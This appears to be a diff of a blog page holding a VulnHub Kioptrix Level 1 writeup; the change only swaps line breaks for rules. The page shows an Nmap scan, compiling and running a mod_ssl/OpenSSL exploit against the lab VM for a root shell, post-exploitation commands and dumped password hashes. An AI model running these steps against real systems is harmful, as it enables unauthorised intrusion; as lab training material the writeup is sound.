@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20190927_vulnhub-hackme.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190928_vulnhub-kioptrix2.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>443/tcp/ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code>: <a href="https://github.com/7h3rAm/writeups#exploit_modssl">exploit_modssl</a>, <a href="https://github.com/7h3rAm/writeups#privesc_modssl">privesc_modssl</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
 Nmap scan report for 192.168.92.181
@@ -139,7 +139,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 443/tcp   |  ssl/https    |  Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
 1024/tcp  |  status       |  1 (RPC #100024)
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We compile this exploit and check it's usage options. It requries a platform specific offset and provides mapping of supported offsets. We determine the required offset value for our target to be <code>0x6b</code> based on the Nmap version detection results for <code>443/tcp</code>. Once executed, the exploit successfully establishes an elevated, remote session with the target:  </p>
 <pre class="nested"><code>gcc -o 47080 47080.c -lcrypto
 ./47080
@@ -153,7 +153,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <pre class="nested"><code>cat /var/mail/root
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot05.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>root@kioptrix.level1&gt; id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 root@kioptrix.level1&gt;  
@@ -173,13 +173,13 @@ root@kioptrix.level1&gt;
 root@kioptrix.level1&gt; users
 root
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:............
 harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:............
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a>  </li>
 <li><a href="https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2">https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2</a>  </li>
